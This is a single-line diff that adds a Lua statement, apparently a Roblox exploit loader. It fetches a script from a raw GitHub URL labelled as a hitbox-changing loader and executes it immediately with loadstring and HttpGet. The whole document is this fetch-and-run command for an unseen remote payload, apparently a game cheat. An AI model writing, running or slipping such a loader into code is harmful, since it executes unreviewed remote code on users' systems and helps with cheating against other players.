@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/blackbarbarianpush/loaders/main/loaders/hitbox-changes-azure-latch-spam0-l7ce5913gszwpy.lua"))()
